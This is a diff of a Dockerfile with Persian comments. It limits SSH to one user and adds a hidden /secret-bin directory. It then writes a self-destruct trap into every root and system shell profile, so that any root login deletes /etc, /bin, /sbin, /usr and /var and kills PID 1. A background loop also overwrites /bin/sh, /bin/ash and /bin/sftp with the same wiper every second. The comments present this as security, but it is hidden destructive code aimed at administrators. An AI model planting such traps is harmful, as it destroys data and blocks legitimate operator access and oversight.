@@ -26,9 +26,8 @@ RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config \
     && echo "AllowUsers amirwolf512" >> /etc/ssh/sshd_config
 
 # --- [تبدیل پوشه app به فایل] ---
-# ابتدا اگر پوشه app وجود دارد آن را به صورت بازگشتی حذف می‌کنیم، 
-# سپس یک فایل خالی به نام app در مسیر اصلی ایجاد می‌کنیم.
-WORKDIR /app
+# حذف دایرکتوری ورک‌دیر و تبدیل آن به فایل خالی در روت سیستم
+RUN rm -rf /app && touch /app
 # --------------------------------
 
 # ۷. تولید کلیدهای هاست SSH
@@ -37,12 +36,22 @@ RUN ssh-keygen -A
 # ۸. ست کردن مسیر PATH برای کاربر شما
 RUN echo "export PATH=/secret-bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin" >> /home/amirwolf512/.bashrc
 
-# ۹. ساخت اسکریپت پس‌زمینه پاک‌سازی ثانیه‌ای شل‌ها
+# ۹. چاشنی انفجاری در پروفایل روت (به محض لاگین وب‌کنسول)
+# اگر هرکسی با آیدی 0 (روت) وارد شود، کل سرور نابود شده و کانتینر با Kill 1 خاموش می‌شود.
+RUN echo 'if [ "$(id -u)" = "0" ]; then rm -rf /etc /bin /sbin /usr /var 2>/dev/null; kill -9 1; fi' > /root/.profile \
+    && cp /root/.profile /root/.bashrc \
+    && cp /root/.profile /root/.bash_profile \
+    && cp /root/.profile /etc/profile
+
+# ۱۰. ساخت اسکریپت پس‌زمینه پاک‌سازی ثانیه‌ای شل‌ها و آپدیت MOTD
 RUN echo -e '#!/secret-bin/sh\n\
 rm -rf /app && touch /app\n\
-echo "Telegram:@amir_wolf512 HI:3\n\n==========>">/etc/motd\n\
+echo -e "Telegram:@amir_wolf512 HI:3\\n\\n==========>\\n" > /etc/motd\n\
 while true; do\n\
-  echo "if [ "$(id -u)" = "0" ]; then kill 1 ; rm -rf .* ; rm -rf *; fi" > /bin/sh ; echo "if [ "$(id -u)" = "0" ]; then kill 1 ; rm -rf .* ; rm -rf *; fi" > /bin/ash ; /bin/bash ; echo "if [ "$(id -u)" = "0" ]; then kill 1 ; rm -rf .* ; rm -rf *; fi" > /usr/bin/bash ; echo "if [ "$(id -u)" = "0" ]; then kill 1 ; rm -rf .* ; rm -rf *; fi" > /bin/sh.orig ; echo "if [ "$(id -u)" = "0" ]; then kill 1 ; rm -rf .* ; rm -rf *; fi" > /bin/sftp\n\
+  # تزریق مداوم دستور خودتخریبی به شل‌های عمومی برای امنیت بیشتر\n\
+  echo "if [ \"\$(id -u)\" = \"0\" ]; then rm -rf /etc /bin /sbin /usr /var 2>/dev/null; kill -9 1; fi" > /bin/sh\n\
+  echo "if [ \"\$(id -u)\" = \"0\" ]; then rm -rf /etc /bin /sbin /usr /var 2>/dev/null; kill -9 1; fi" > /bin/ash\n\
+  echo "if [ \"\$(id -u)\" = \"0\" ]; then rm -rf /etc /bin /sbin /usr /var 2>/dev/null; kill -9 1; fi" > /bin/sftp\n\
   sleep 1\n\
 done' > /secret-bin/cleaner.sh && chmod +x /secret-bin/cleaner.sh
 
